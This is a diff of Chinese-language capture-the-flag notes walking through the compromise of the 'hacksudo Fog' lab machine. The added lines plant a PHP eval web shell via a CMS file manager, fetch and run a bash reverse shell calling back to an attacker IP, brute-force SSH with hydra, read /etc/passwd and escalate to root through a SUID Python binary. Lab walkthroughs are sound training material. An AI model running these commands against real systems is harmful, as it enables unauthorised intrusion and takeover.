@@ -169,7 +169,7 @@ ABCDEFGHIJKLMNOPQRSTUVWXYZ
 DEFGHIJKLMNOPQRSTUVWXYZABC
 zzzz.orfdokrvw/irj Xvhuqdph=irj:sdvvzrug=kdfnvxgrLVUR 
 
-#凯撒解密，Shift by 3偏移量为3
+#cesar 凯撒解密，Shift by 3偏移量为3
 wwww.localhost/fog Username=fog:password=hacksudoISRO
 
 #web 登录
@@ -178,55 +178,104 @@ fog
 #登录成功，进入管理页面
 
 # cms made simple 2.2.5  (需要密码认证，远程代码执行漏洞)
-cve-2018-1000094.py
+cve-2018-1000094.py  #代码存在问题，无法执行脚本
 
-#在管理员面板 
+#在管理面板,手动使用该漏洞
+Content - File Manager
+上传 txt 文件
+<?php eval($_REQUEST['angel'])?>  #文件内容
+#上传成功
+选择 txt 文件
+选择copy 
+复制该文件 并命名为 .php 文件
+
+#直接使用 蚁剑 连接
+开启终端窗口 shell为 dash
+不能直接使用命令反弹 shell 到kali上
+需要将 shell 写入文件  然后执行
+
+#kali攻击机 监听 4444
+nc -lvnp 4444
+
+#kali 另一个窗口
+创建 bash 文件  
+#shell.sh
+bash -c "bash -i >& /dev/tcp/192.168.1.15/4444 0>&1"
+
+#python 临时服务器
+python -m http.server 8083 --bind=192.168.1.15
+
+#蚁剑 终端 下载文件
+wget http://192.168.1.15:8083/shell.sh
+#下载到临时目录 /tmp
+
+chmod +x shell.sh
+./shell.sh
+#反弹成功，kali接收到shellw
 
 uname -a
 #Linux hacksudo 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 
-
-
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
-sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
-mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
-_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
-statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
-tftp:x:109:114:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
-ftpuser:x:1002:1002::/dev/null:/etc
+cat /etc/passwd
+# root:x:0:0:root:/root:/bin/bash
+# statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
+# tftp:x:109:114:tftp daemon,,,:/srv/tftp:/usr/sbin/nologin
+# ftpuser:x:1002:1002::/dev/null:/etc
 isro:x:1003:1003:,,,:/home/isro:/bin/bash
-dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+# dnsmasq:x:111:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 
+#hydra 爆破ssh
+hydra -l isro -P /usr/share/wordlists/rockyou.txt -vV -e ns 192.168.1.38 ssh
+# [ATTEMPT] target 192.168.1.38 - login "isro" - pass "000000" - 25 of 14344403 [child 7] (0/2)
+# [ATTEMPT] target 192.168.1.38 - login "isro" - pass "michelle" - 26 of 14344403 [child 15] (0/2)
+# [ATTEMPT] target 192.168.1.38 - login "isro" - pass "tigger" - 27 of 14344403 [child 0] (0/2)
+# [ATTEMPT] target 192.168.1.38 - login "isro" - pass "sunshine" - 28 of 14344403 [child 4] (0/2)
+[22][ssh] host: 192.168.1.38   login: isro   password: qwerty
+# [STATUS] attack finished for 192.168.1.38 (waiting for children to complete tests)
+# 1 of 1 target successfully completed, 1 valid password found
 
+#ssh登录
+ssh isro@192.168.1.38
+: qwerty
 
+# isro@hacksudo:~$ id
+uid=1003(isro) gid=1003(isro) groups=1003(isro)
 
+#user flag
+cat user.txt
+# 8b64d2451b7a8f3fd17390f88ea35917
 
+#查看fog目录
+isro@hacksudo:~$ cd fog
+isro@hacksudo:~/fog$ ls -la
+# total 3700
+# drwxr-xr-x 2 isro isro    4096 May 13  2021 .
+# drwxr-x--- 5 isro isro    4096 May 13  2021 ..
+-rwxr-xr-x 1 root isro   16712 May 12  2021 fog
+# -rw-r--r-- 1 isro isro       0 May  6  2021 get
+# -rwxr-xr-x 1 isro isro   69368 May  6  2021 ping
+# -rwxr-xr-x 1 isro isro 3689352 May  6  2021 python
 
+# fog 文件可以用 root权限 运行
+./fog
+发现是 python 终端，权限是 root
+# Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
+# [GCC 8.3.0] on linux2
+# Type "help", "copyright", "credits" or "license" for more information.
 
+>>> import pty;pty.spawn('/bin/bash');
+# (root hacksudo)-[~/fog]
 
+id
+uid=0(root) gid=1003(isro) groups=1003(isro)
+
+#获得root flag
+cd /root
+cat root.txt
+# great you rooted hacksudo Fog Box !!!
+# flag {4356a779ce18252fa1dd2d2b6ab56b19}
+
+#全部完成
 
 
 
